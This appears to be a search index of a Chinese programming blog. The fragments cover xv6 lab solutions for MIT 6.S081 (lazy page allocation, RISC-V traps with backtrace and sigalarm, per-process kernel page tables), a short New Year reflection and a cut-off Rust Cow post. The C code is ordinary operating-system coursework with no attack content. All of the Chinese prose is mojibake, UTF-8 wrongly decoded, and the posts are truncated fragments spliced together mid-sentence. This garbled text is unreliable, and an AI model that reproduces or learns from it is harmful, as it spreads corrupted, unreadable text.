faultçš„å¤„ç†ï¼š else if(cause == 13 || cause == 15) { uint64 va = r_stval(); if(lazy_uvmalloc(p-\u003epagetable, va) != 0) { p-\u003ekilled = 1; } } æ·»åŠ ä»¥ä¸Šä»£ç ä¹‹åï¼Œåœ¨uvmunmap()ä¸­æ·»åŠ å¦‚ä¸‹ä¿®æ”¹ï¼Œå–æ¶ˆpanicï¼š if((pte = walk(pagetable, a, 0)) == 0) // panic(\"uvmunmap: walk\"); continue; if((*pte \u0026 PTE_V) == 0) // panic(\"uvmunmap: not mapped\"); continue; å®Œæˆå¦‚ä¸Šä»£ç åï¼Œecho hiå¯ä»¥æ­£å¸¸è¿è¡Œã€‚ Lazytests and Usertests ç¬¬ä¸‰å…³éœ€è¦å¤„ç†ç¬¬äºŒå…³çš„ä¸€äº›é—ç•™ç»†èŠ‚é—®é¢˜ï¼Œå®Œå–„lazy allocationï¼Œä½¿ä¹‹é€šè¿‡å…¨éƒ¨æµ‹è¯•ã€‚ Handle negative sbrk() arguments. å¯¹äºè´Ÿæ•°å‚æ•°ï¼Œéœ€è¦unmapå¯¹åº”é¡µé¢: if(n \u003c 0){ p-\u003esz = uvmdealloc(p-\u003epagetable, p-\u003esz, p-\u003esz + n); } else { p-\u003esz += n; } Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk(). Handle faults on the invalid page below the user stack. è¿™é‡Œéœ€è¦åˆ¤æ–­äº§ç”Ÿpage faultçš„ va æ˜¯å¦åœ¨å½“å‰è¿›ç¨‹æ‹¥æœ‰çš„åœ°å€èŒƒå›´ä¹‹å¤–ã€‚ if (va \u003e= p-\u003esz || va \u003c p-\u003etrapframe-\u003esp) p-\u003ekilled = 1; Handle the parent-to-child memory copy in fork() correctly. åœ¨fork()ä¸­ï¼Œä½¿ç”¨å¦‚ä¸‹ä»£ç å°†å†…å­˜ä»çˆ¶è¿›ç¨‹å¤åˆ¶åˆ°å­è¿›ç¨‹ï¼š // Copy user memory from parent to child. if(uvmcopy(p-\u003epagetable, np-\u003epagetable, p-\u003esz) \u003c 0){ freeproc(np); release(\u0026np-\u003elock); return -1; } è¿›å…¥uvmcopy()ï¼Œåšå‡ºå¦‚ä¸‹ä¿®æ”¹ï¼š if((pte = walk(old, i, 0)) == 0) // panic(\"uvmcopy: pte should exist\"); continue; if((*pte \u0026 PTE_V) == 0) // panic(\"uvmcopy: page not present\"); continue; Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated. å½“è¿›ç¨‹è¿›è¡Œsyscallæ—¶ï¼Œä¼šé™·å…¥ kernelï¼Œæ­¤æ—¶stapåˆ‡æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼ŒRISC-Vç¡¬ä»¶æ— æ³•å†ä¸ºç”¨æˆ·åœ°å€ç©ºé—´äº§ç”Ÿpage faultï¼Œæ‰€ä»¥å½“ç”¨æˆ·æ‰§è¡Œread()å’Œwrite()ï¼Œå°†ç”¨æˆ·åœ°å€ç©ºé—´çš„æœ‰æ•ˆè™šæ‹Ÿåœ°å€ä¼ é€’ç»™å†…æ ¸æ—¶ï¼Œå¦‚æœè¯¥è™šæ‹Ÿåœ°å€æ²¡æœ‰ map åˆ°æœ‰æ•ˆç‰©ç†å†…å­˜ï¼Œå°†ä¼šå¯¼è‡´ç¨‹åº panicã€‚kernel è¿è¡Œæ—¶ï¼Œä½¿ç”¨walkaddrè¿›è¡Œè™šå®åœ°å€è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹å…¶ä¸­çš„ä»£ç ï¼Œå½“è™šæ‹Ÿåœ°å€æœ‰æ•ˆè€Œé¡µè¡¨ä¸­æœª map æ—¶ï¼Œå°è¯•ä¸ºå…¶åˆ†é…ç‰©ç†å†…å­˜ï¼š uint64 walkaddr(pagetable_t pagetable, uint64 va) { pte_t *pte; uint64 pa; struct proc *p = myproc(); if(va \u003e= MAXVA) return 0; pte = walk(pagetable, va, 0); if(pte == 0 || (*pte \u0026 PTE_V) == 0) { if (va \u003e= p-\u003esz || va \u003c p-\u003etrapframe-\u003esp) { return 0; } if(lazy_uvmalloc(pagetable, va) == 0) { pte = walk(pagetable, va, 0);; } else { return 0; } } if((*pte \u0026 PTE_U) == 0) return 0; pa = PTE2PA(*pte); return pa; } Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process. åœ¨å…³å¡ 2 ä¸­ï¼Œå·²ç»åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œå½“lazy_uvmalloc()è°ƒç”¨kalloc()å¤±è´¥æ—¶ï¼Œè¿”å›é 0ï¼Œæ€æ‰è¿›ç¨‹ï¼š if(lazy_uvmalloc(p-\u003epagetable, va) != 0) { p-\u003ekilled = 1; } åšå®Œå¦‚ä¸Šä¿®æ”¹ï¼Œä¾¿èƒ½é€šè¿‡æ‰€æœ‰æµ‹è¯•ã€‚ æœ€ç»ˆä»£ç è§github ä»“åº“ã€‚ ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:0:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"RISC-V assembly è¿™æ˜¯ä¸€ä¸ªç®€å•çš„RISC-Væ±‡ç¼–çƒ­èº«å…³å¡ã€‚ æˆ‘ä»¬éœ€è¦æŸ¥çœ‹user/call.asmæ¥å›ç­”ä¸€äº›é—®é¢˜ï¼Œå…¶ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š int g(int x) { 0: 1141 addi sp,sp,-16 2: e422 sd s0,8(sp) 4: 0800 addi s0,sp,16 return x+3; } 6: 250d addiw a0,a0,3 8: 6422 ld s0,8(sp) a: 0141 addi sp,sp,16 c: 8082 ret 000000000000000e \u003cf\u003e: int f(int x) { e: 1141 addi sp,sp,-16 10: e422 sd s0,8(sp) 12: 0800 addi s0,sp,16 return g(x); } 14: 250d addiw a0,a0,3 16: 6422 ld s0,8(sp) 18: 0141 addi sp,sp,16 1a: 8082 ret 000000000000001c \u003cmain\u003e: void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(\"%d %d\\n\", f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7b850513 addi a0,a0,1976 # 7e0 \u003cmalloc+0xea\u003e 30: 00000097 auipc ra,0x0 34: 608080e7 jalr 1544(ra) # 638 \u003cprintf\u003e exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 276080e7 jalr 630(ra) # 2b0 \u003cexit\u003e Which registers contain arguments to functions? For example, which register holds 13 in mainâ€™s call to printf? æ ¹æ®RISC-Vçš„ calling conventionï¼Œa0-a7,fa0-fa7åŒ…å«äº†å‡½æ•°çš„å‚æ•°ã€‚è°ƒç”¨printfæ—¶ï¼Œa0ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œa1æ˜¯ 12ï¼Œa2æ˜¯ 13ã€‚ Where is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.) ç”±äºfå’Œgå‡½æ•°éƒ½æ˜¯ç®€å•çš„å¸¸æ•°è®¡ç®—ï¼Œä¼ é€’çš„å‚æ•°ä¹Ÿæ˜¯å¸¸æ•° 8ï¼Œæ‰€ä»¥å‡½æ•°è°ƒç”¨è¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰äº†ï¼Œåœ¨0x26ä½ç½®ï¼Œç›´æ¥å°†å‡½æ•°è°ƒç”¨ç»“æœç«‹å³æ•° 12 è½½å…¥å¯„å­˜å™¨a1ã€‚ At what address is the function printf located? ä»ä»£ç ä¸­çœ‹ï¼Œå¾ˆæ˜¾ç„¶ï¼Œåœ¨0x638å¾—ä½ç½®ã€‚ What value is in the register ra just after the jalr to printf in main? jalræŒ‡ä»¤æ˜¯é“¾æ¥å¹¶è·³è½¬ï¼Œå°†è¿”å›åœ°å€ä¿å­˜åˆ°raå¯„å­˜å™¨ï¼Œæ‰€ä»¥åº”ä¸º0x38ã€‚ unsigned int i = 0x00646c72; printf(\"H%x Wo%s\", 57616, \u0026i); è¿è¡Œä»¥ä¸Šä»£ç ï¼Œè¾“å‡ºHE110 Worldã€‚æ•°å­— 57616 çš„ 16 è¿›åˆ¶è¡¨ç¤ºä¸º 0xE110ï¼›RISC-Vé‡‡ç”¨å°ç«¯æ³•è¡¨ç¤ºï¼Œ16 è¿›åˆ¶çš„ 72ã€6cã€64ã€00 è¡¨ç¤ºå­—ç¬¦ä¸²â€œrld\\0â€ï¼Œå¦‚æœæ”¹ä¸ºå¤§ç«¯æ³•ï¼Œåˆ™åº”åè¿‡æ¥ï¼Œå˜ä¸ºi=0x726c6400ã€‚ printf(\"x=%d y=%d\", 3); è¯¥printfè°ƒç”¨å°‘äº†ä¸€ä¸ªå‚æ•°ï¼Œæ ¹æ® calling conventionï¼Œå¯¹y=%dä¼šå–a2çš„å€¼è¿›è¡Œè¾“å‡ºã€‚ Backtrace è¯¥æ­¥éª¤éœ€è¦å®ç°ä¸€ä¸ªbacktraceå‡½æ•°ï¼Œæ‰“å°å‡ºè°ƒç”¨è½¨è¿¹ï¼Œå³æ¯æ¬¡è°ƒç”¨çš„è¿”å›åœ°å€ã€‚ xv6 è¿è¡Œæ—¶çš„ stack ç»“æ„å¦‚ä¸‹å›¾ï¼š s0/fpä¸­å­˜å‚¨ç€å½“å‰çš„ frame pointerï¼Œfp-8æŒ‡å‘è¿”å›åœ°å€ï¼Œfp-16æŒ‡å‘ä¸Šä¸€ä¸ªfpåœ°å€ã€‚ æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¸æ–­æ‰“å°å½“å‰fpçš„è¿”å›åœ°å€å¹¶å‘å‰è¿½æº¯ï¼Œç›´åˆ° stack é¡¶éƒ¨ã€‚ é¦–å…ˆåœ¨kernel/riscv.hæ·»åŠ å†…è”æ±‡ç¼–å‡½æ•°ä»¥è·å–fpå€¼ï¼š static inline uint64 r_fp() { uint64 x; asm volatile(\"mv %0, s0\" : \"=r\" (x) ); return x; } ç„¶ååœ¨kernel/printf.cå®ç°backtraceï¼š void backtrace(void) { uint64 fp, top; fp = r_fp(); top = PGROUNDUP(fp); while(1) { if (fp == top) break; printf(\"%p\\n\", *(uint64*)(fp-8)); fp = *(uint64*)(fp-16); } } ä¹‹ååœ¨sys_sleepå’Œpanicä¸­åŠ å…¥å¯¹backtraceçš„è°ƒç”¨å³å¯ã€‚ Alarm æœ¬å…³éœ€è¦å®ç°ä¸€ä¸ªsigalarm(interval, handler)ç³»ç»Ÿè°ƒç”¨ï¼Œcpu æ¯æ¶ˆè€— interval ä¸ª ticks åï¼Œè°ƒç”¨ä¸€æ¬¡ handler å‡½æ•°ã€‚ é¦–å…ˆè¦åœ¨user/user.hæ·»åŠ å¯¹æ–°ç³»ç»Ÿè°ƒç”¨çš„ç”¨æˆ·æ¥å£ï¼š int sigalarm(int ticks, void (*handler)()); int sigreturn(void); sigreturnæ˜¯ä¸€ä¸ªè¢«è®¾è®¡ç”¨æ¥å¸®åŠ©æˆ‘ä»¬å®ç°sigalarmçš„å‡½æ•°ï¼Œæ¯ä¸ªhandleræ‰§è¡Œç»“æŸåï¼Œéƒ½è°ƒç”¨sigreturnã€‚ é¦–å…ˆè¦åœ¨procä¸­æ·»åŠ æ–°çš„å­—æ®µï¼Œè®°å½•intervalï¼Œhandlerä»¥åŠæ‰€éœ€çš„è¾…åŠ©å˜é‡ï¼Œåœ¨allocpocä¸­å¯¹å®ƒä»¬è¿›è¡Œåˆå§‹åŒ–ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œæ—¶ï¼Œä¿å­˜ç›¸åº”çš„å€¼åˆ°procä¸­ã€‚ uint64 sys_sigalarm(void) { struct proc *p = myproc(); if (argint(0, \u0026(p-\u003ealarm_interval)) \u003c 0) return -1; if (argaddr(1, \u0026(p-\u003ealarm_hanlder)) \u003c 0) return -1; return 0; } ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨usertrapè¯†åˆ«åˆ° timer interrupt æ—¶ï¼Œè¿›è¡Œå¤„ç†ï¼Œhints å‘Šè¯‰æˆ‘ä»¬ï¼Œæ˜¯which_dev == 2ã€‚ // give up the CPU if this is a timer interrupt. if(which_dev == 2) { p-\u003epassed++; if (p-\u003epassed == p-\u003ealarm_interval) { p-\u003epassed = 0; p-\u003etrapframe-\u003eepc = p-\u003ealarm_hanlder; } yield(); } æ­¤æ—¶åªéœ€è®©sigreturnç›´æ¥è¿”å› 0ï¼Œè¿™æ ·ç®€å•åœ°æ·»åŠ ä»£ç ï¼Œå¯ä»¥è®©test0æ‰“å°å‡º alarmï¼Œä½†æ˜¯éšåï¼Œç¨‹åºä¾¿é€»è¾‘å´©æºƒï¼Œæ— æ³•é€šè¿‡æµ‹è¯•ã€‚è¿™æ˜¯å› ä¸ºå½“ kernle å¤„ç†å®Œ time interruï¼Œå›åˆ°ç”¨æˆ·æ¨¡å¼ï¼Œpc æŒ‡å‘ handler çš„ä½ç½®ï¼Œä¹‹åå¼€å§‹æ‰§è¡Œ handler å‡½æ•°ï¼Œåœ¨ handler å‡½æ•°å°¾éƒ¨ï¼Œè°ƒç”¨sigreturné™·å…¥ kernelï¼Œå¹¶æ— æ“ä½œï¼Œå†æ¬¡è¿”å›ç”¨æˆ·æ€ï¼Œæ‰§è¡Œ handler å°¾éƒ¨çš„retã€‚æ­¤æ—¶ç”¨äºretæŒ‡ä»¤çš„è¿”å›åœ°å€å¯„å­˜å™¨raæ‰€å­˜å‚¨çš„å€¼ï¼Œæ˜¯åœ¨ time interrupt ä¹‹æ—¶ï¼Œtest å‡½æ•°æ‰§è¡Œä¸­äº§ç”Ÿçš„raçš„å€¼ï¼Œå¹¶éæ˜¯ time interrupt å‘ç”Ÿæ—¶ï¼Œæ­£åœ¨æ‰§è¡Œçš„ä»£ç åœ°å€ï¼Œæ‰€ä»¥ç¨‹åºä¸èƒ½è¿”å›æ­£ç¡®ä½ç½®ï¼Œå¹¶ä¸” handler æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¿®æ”¹äº†çš„éƒ¨åˆ†å¯„å­˜å™¨ä¹Ÿéœ€è¦æ¢å¤ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ handler æ‰§è¡Œå‰ä¿å­˜tramframeï¼Œåœ¨æ‰§è¡Œåçš„sigreturnä¸­æ¢å¤tramframeï¼Œè®©ä»£ç è¿”å›åˆ°æ­£ç¡®çš„ä½ç½®æ‰§è¡Œï¼Œå¹¶ä½¿å¯„å­˜å™¨çš„æ•°å€¼å¤åŸã€‚åŒæ—¶ï¼Œæ ¹æ® hintsï¼Œä¸ºäº†é˜²æ­¢ handler æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«é‡å¤è°ƒç”¨ï¼Œæ·»åŠ permissionå­—æ®µæ¥è¿›è¡Œæ§åˆ¶ï¼Œæ­¤å¤–ï¼Œinterval==0æ—¶ï¼Œæ„å‘³ç€å–æ¶ˆ alarmã€‚ uint64 sys_sigreturn(void) { struct proc* p = myproc(); p-\u003epermission = 1; *p-\u003etrapframe = p-\u003ealarm_frame; printf(\"ra:%p\\n\", p-\u003etrapframe-\u003era); return 0; } åœ¨usertrapä¸­ï¼š if(which_dev == 2) { p-\u003epassed++; if (p-\u003epermission \u0026\u0026 p-\u003ealarm_interval \u0026\u0026 p-\u003epassed == p-\u003ealarm_interval) { p-\u003epassed = 0; p-\u003epermission = 0; p-\u003ealarm_frame = *p-\u003etrapframe; p-\u003etrapframe-\u003eepc = p-\u003ealarm_hanlder; } yield(); } åˆ°æ­¤ï¼Œä¾¿å®Œæˆäº† lab4 trapsã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç‚¹ï¼Œç¬”è€…æ›¾å°è¯•åªä¿å­˜tramframeä¸­çš„caller saveå¯„å­˜å™¨ï¼Œä½†æ˜¯æ— æ³•é€šè¿‡æµ‹è¯•ã€‚æœ€ç»ˆ","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:0:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"ç¯å¢ƒé…ç½® å‰ä¸¤ä¸ª lab æ¯”è¾ƒåŸºç¡€ï¼Œå°±ä¸å†™åšå®¢è®°å½•äº†ï¼Œäºæ˜¯ä» lab3 å¼€å§‹ã€‚ ç¯å¢ƒé…ç½®å‚è€ƒå®˜ç½‘ ã€‚å¦‚æœä½¿ç”¨ubuntu20.04çš„è¯ï¼Œç¯å¢ƒé…ç½®æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦ä»qemu å®˜ç½‘ä¸‹è½½æºç ï¼Œæ‰‹åŠ¨ build å°±å®Œæˆäº†ï¼›æˆ–è€…ä½¿ç”¨archlinuxï¼Œä¸€æ¡å‘½ä»¤ä¾¿å…¨éƒ¨é…ç½®å®Œæˆã€‚ç¬”è€…ä½¿ç”¨çš„å¹³å°æ˜¯macOS 11.2.1ï¼Œä½¿ç”¨homebrewå®‰è£…çš„qemuåœ¨å‰ä¸¤ä¸ª lab æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨ç¬¬ä¸‰ä¸ª lab å‡ºç°äº† crashï¼Œæ”¹ä¸ºä»æºç æ‰‹åŠ¨ç¼–è¯‘å®‰è£…qemu 5.1.0è§£å†³äº†ã€‚ 2021-02-24 ä¿®æ­£ï¼šåš lab4 æŸ¥çœ‹call.asmï¼Œå‘ç°.text æŒ‡ä»¤é•¿åº¦ä¸ä¸€ï¼Œæœ‰çš„ä¸º 2ï¼Œæœ‰çš„ä¸º 4ï¼Œé‚æ‰¾äººè¯·æ•™ï¼ŒçŒœæµ‹æ˜¯æŒ‡ä»¤å‹ç¼©å¯¼è‡´ï¼Œäºæ˜¯è”æƒ³åˆ°ä¹‹å‰å‡ ä¹æ‰€æœ‰äººéƒ½é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼Œä½¿ç”¨ gdb æ‰“æ–­ç‚¹è°ƒè¯•æ—¶ï¼Œå‡ºç°ï¼šâ€œCannot access memory at address xxxâ€ã€‚ç»è¿‡å¤§ä½¬æŸ¥é˜…å¹¶å°è¯•ï¼Œå‘ç°åœ¨.gdbinit.tmpl-riscvä¸­åŠ å…¥set riscv use-compressed-breakpoints yeså¯ä»¥æœ‰æ•ˆè§£å†³ã€‚ Print a page table è¯¥éƒ¨åˆ†çš„å†…å®¹æ˜¯æ‰“å°å‡ºç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ã€‚è¿™ä¸ªéå¸¸ç®€å•ï¼š å‚ç…§freewalkå‡½æ•°ï¼Œé¦–å…ˆåœ¨kernel/vm.cæ·»åŠ vmprint: void _vmprint(pagetable_t pagetable, int level) { int j; // there are 2^9 = 512 PTEs in a page table. for(int i = 0; i \u003c 512; i++){ pte_t pte = pagetable[i]; if(pte \u0026 PTE_V){ for(j = 0; j \u003c= level; j++) { if(j == 0) printf(\"..\"); else printf(\" ..\"); } uint64 child = PTE2PA(pte); printf(\"%d: pte %p pa %p\\n\", i, pte, child); // this PTE points to a lower-level page table. if ((pte \u0026 (PTE_R | PTE_W | PTE_X)) == 0) { _vmprint((pagetable_t)child, level + 1); } } } } // print the page tables void vmprint(pagetable_t pagetable) { printf(\"page table %p\\n\", pagetable); _vmprint(pagetable, 0); } ç„¶ååœ¨exec.cä¸­æ’å…¥ä»£ç æ‰“å°ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ï¼š if(p-\u003epid == 1) { vmprint(p-\u003epagetable); } å¯åŠ¨åæ‰“å°å‡ºå¦‚ä¸‹å†…å®¹ï¼š page table 0x0000000087f67000 ..0: pte 0x0000000021fd8c01 pa 0x0000000087f63000 .. ..0: pte 0x0000000021fd8801 pa 0x0000000087f62000 .. .. ..0: pte 0x0000000021fd901f pa 0x0000000087f64000 .. .. ..1: pte 0x0000000021fd840f pa 0x0000000087f61000 .. .. ..2: pte 0x0000000021fd801f pa 0x0000000087f60000 ..255: pte 0x0000000021fd9801 pa 0x0000000087f66000 .. ..511: pte 0x0000000021fd9401 pa 0x0000000087f65000 .. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000 .. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000 åœ¨ç”¨æˆ·åœ°å€ç©ºé—´æœ€é«˜å¤„ï¼Œ511ï¼Œ510 entry å¯¹åº”trampolineå’Œtrapframeã€‚åœ¨ç”¨æˆ·åœ°å€ç©ºé—´æœ€ä½å¤„ï¼Œ0ï¼Œ1ï¼Œ2 entry å¯¹åº”text\\dataï¼Œguard pageï¼Œstackï¼Œå¦‚æœä¿®æ”¹ä¸‹_vmprintæ‰“å°å‡ºæ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥å‘ç° entry 1 çš„PTE_Uæ˜¯æ— æ•ˆçš„ï¼Œå¯ä»¥é˜²æ­¢æ ˆæº¢å‡ºã€‚é¡¶çº§é¡µè¡¨åªä½¿ç”¨åˆ°ç¬¬ 255 ä¸ª entryï¼Œå› ä¸ºxv6åªä½¿ç”¨äº† 38 ä½åœ°å€ã€‚ A kernel page table per process ç¬¬äºŒéƒ¨åˆ†æ˜¯è®©æ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰å•ç‹¬çš„å†…æ ¸é¡µè¡¨ï¼Œä¸ºç¬¬ä¸‰éƒ¨åˆ†ç›´æ¥ä½¿ç”¨ç”¨æˆ·è™šæ‹Ÿåœ°å€åšå‡†å¤‡ã€‚ é¦–å…ˆåœ¨kernel/proc.hä¸­çš„struct procå®šä¹‰ä¸­æ·»åŠ  pagetable_t kpagetable; ä»¿ç…§kvminitï¼Œå®ç°ä¸€ä¸ªåˆå§‹åŒ–è¿›ç¨‹å†…æ ¸é¡µè¡¨çš„å‡½æ•°ï¼š pagetable_t proc_kvminit(void) { int i; pagetable_t proc_kpagetable = uvmcreate(); if (proc_kpagetable == 0) { return 0; } for(i = 1; i \u003c 512; i++) { proc_kpagetable[i] = kernel_pagetable[i]; } ukvmmap(proc_kpagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, CLINT, CLINT, 0x10000, PTE_R | PTE_W); ukvmmap(proc_kpagetable, PLIC, PLIC, 0x400000, PTE_R | PTE_W); return proc_kpagetable; } void ukvmmap(pagetable_t kernel_pagetable ,uint64 va, uint64 pa, uint64 sz, int perm) { if(mappages(kernel_pagetable, va, sz, pa, perm) != 0) panic(\"kvmmap\"); } æ ¹æ®åç»­å®éªŒï¼Œæˆ‘ä»¬èƒ½ä¿®æ”¹çš„å†…æ ¸åœ°å€ç©ºé—´ä¸è¶…è¿‡é¡¶çº§é¡µè¡¨çš„ç¬¬ä¸€ä¸ª entry çš„åœ°å€èŒƒå›´ï¼Œæ‰€ä»¥æˆ‘ä»¬å’Œkernel_pagetableå…±äº«å…¶ä»– entryï¼Œç›´æ¥è¿›è¡Œå¤åˆ¶ï¼Œè¿™æ ·èƒ½å¤ŸèŠ‚çº¦æ¬¡çº§é¡µè¡¨å ç”¨çš„å†…å­˜ç©ºé—´ã€‚ kernel/proc.cä¸­çš„allocprocå‡½æ•°ï¼Œè´Ÿè´£åˆ†é…ã€åˆå§‹åŒ–è¿›ç¨‹ï¼Œåœ¨å…¶ä¸­å¦‚ä¸‹è°ƒç”¨ï¼š p-\u003ekpagetable = proc_kvminit(); if (p-\u003ekpagetable == 0) { freeproc(p); release(\u0026p-\u003elock); return 0; } ä¹‹åï¼Œå®˜ç½‘çš„hintæåˆ°éœ€è¦ä¸ºæ¯ä¸ªè¿›ç¨‹åˆå§‹åŒ–kernel stackï¼Œå¯èƒ½éœ€è¦å°†proinitä¸­çš„éƒ¨åˆ†ä»£ç è½¬ç§»åˆ°allocprocä¸­ï¼Œç”±äºæˆ‘ä»¬å’Œkernel_pagetableå…±äº«äº†é¡¶çº§é¡µè¡¨ entry 1 æ„å¤–çš„æ‰€æœ‰é¡µè¡¨ï¼Œæ‰€ä»¥ä»å¯ä»¥å°†kernel stackçš„åˆå§‹åŒ–ä»£ç ç•™åœ¨procinitä¸­ã€‚ æ¥ä¸‹æ¥ï¼Œä¿®æ”¹schedulerï¼Œå½“è°ƒåº¦åˆ°è¿›ç¨‹æ‰§è¡Œæ—¶ï¼Œå°†è¿›ç¨‹çš„å†…æ ¸é¡µè¡¨è½½å…¥stapå¯„å­˜å™¨ï¼ˆå‚è€ƒkvminithartï¼‰ï¼Œå½“æ²¡æœ‰è¿›ç¨‹è¿è¡Œæ—¶ï¼Œä½¿ç”¨kernel_pagetableï¼š if(p-\u003estate == RUNNABLE) { // Switch to chosen process. It is the process's job // to release its lock and then reacquire it // before jumping back to us. p-\u003estate = RUNNING; c-\u003eproc = p; w_satp(MAKE_SATP(p-\u003ekpagetable)); sfence_vma(); swtch(\u0026c-\u003econtext, \u0026p-\u003econtext); // Process is done running for now. // It should have changed its p-\u003estate before coming back. c-\u003eproc = 0; kvminithart(); found = 1; } ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨free_procä¸­æ·»åŠ é‡Šæ”¾å†…æ ¸é¡µè¡¨çš„ä»£ç ï¼š if(p-\u003ekpagetable) { proc_freekpagetable(p-\u003ekpagetable); } void proc_freekpagetable(pagetable_t kpagetable) { pte_t pte = kpagetable[0]; pagetable_t level1 = (pagetable_t) PTE2PA(pte); for (int i = 0; i \u003c 512; i++) { pte_t pte = level1[i]; if (pte \u0026 PTE_V) { uint64 level2 = PTE2PA(pte); kfree((void *) level2); level1[i] = 0; } } kfree","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:0:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["æ„Ÿæƒ³"],"content":"2020 åºšå­é¼ å¹´ï¼Œåœ¨å®¶ä¸Šäº†åŠå¹´ç½‘è¯¾ï¼Œæ…µæ‡’åœ°èººå°¸ï¼ŒåŒæ—¶åˆåœ¨ç„¦è™‘æ„Ÿçš„é©±ä½¿ä¸‹æˆ˜æˆ˜å…¢å…¢åœ°å½“ä¸ªåšé¢˜å®¶ã€‚è€Œåï¼ŒäºŒè¿›å®«å®ä¹ ï¼ŒåŒæ—¶å‚åŠ å¤ä»¤è¥ï¼Œæ‹¿åˆ° offerï¼›å›½åº†ç¦»èŒï¼Œè¿›å…¥å®éªŒå®¤ï¼Œæˆä¸ºä¸´æ—¶å·¥ã€‚ä¸€ç›´åœ¨å¿™ç¢Œï¼Œä¸€ç›´åœ¨ç„¦è™‘ã€‚ ã€Œå¾ä¹‹å¤§æ‚£ï¼Œå› æœ‰å¾èº«ã€ï¼Œæˆé•¿çš„ç»å†ï¼Œè®©æˆ‘æ€»æ˜¯è¢«ã€Œç„¦è™‘ã€äºŒå­—å›°æ‰°ã€‚å¯¹è‡ªå·±æƒ³åšçš„äº‹ï¼Œéš”å¾—å¾ˆä¹…ä¾¿å¼€å§‹è®¡åˆ’ï¼Œæœ‰ä¸€ç‚¹ä¸é¡ºæ„ä¾¿ç„¦è™‘å¾—ä¸è¡Œã€‚äººç”Ÿä¸­å¹¶ä¸æ˜¯å¾ˆå¿™çš„é˜¶æ®µï¼Œä¹Ÿå› ä¸ºç„¦è™‘å˜å¾—æ— ç«¯å¿™ç¢Œã€‚å¥½åœ¨è¿æ°”ä¸é”™ï¼Œè®¸å¤šç›®æ ‡éƒ½å®ç°äº†ï¼Œå¯¹è‡ªå·±çš„å‘å±•ä¹Ÿæœ‰äº†å¤§è‡´çš„è§„åˆ’ã€‚ å‘Šåˆ«åºšå­é¼ å¹´ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½å…‹åˆ¶ç„¦è™‘çš„å¿ƒå¢ƒï¼Œèƒ½é™ä¸‹æ¥ï¼Œåšå¥½è‡ªå·±æ‰‹ä¸Šçš„äº‹ï¼Œæ½œå¿ƒè¯»æ¯ä¸€ç¯‡è®ºæ–‡ï¼Œåƒä¸€ä¸ªå·¥ç¨‹å¸ˆä¸€æ ·åšé¡¹ç›®ï¼Œå­¦ä¹ æ›´å¤šçš„äººç”ŸçŸ¥è¯†ã€‚ æœ€åï¼Œæ–°çš„ä¸€å¹´ï¼Œè¦ç‰›æ°”å†²å¤©ã€‚ ","date":"2021-02-11","objectID":"/posts/goodbyte-2020/:0:0","tags":["æ–°å¹´"],"title":"å‘Šåˆ«2020åºšå­é¼ å¹´","uri":"/posts/goodbyte-2020/"},{"categories":["rust"],"content":"å®šä¹‰ Cowæ˜¯ä¸€ä¸ªæä¾›äº†å†™æ—¶å…‹éš†åŠŸèƒ½çš„æ™ºèƒ½æŒ‡é’ˆï¼Œå®ƒå¯ä»¥åŒ…è£…å¯¹æ•°æ®çš„å€Ÿç”¨ï¼Œå½“éœ€è¦ä¿®æ”¹æ•°æ®æˆ–è€…è·å–æ•°æ®çš„æ‰€æœ‰æƒæ—¶ï¼Œå¯¹æ•°æ®cloneã€‚å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š pubenum Cow\u003c'a,B\u003ewhereB: 'a +ToOwned+?Sized,{Borrowed(\u0026'aB),Owned(\u003cBasToOwned\u003e::Owned),} 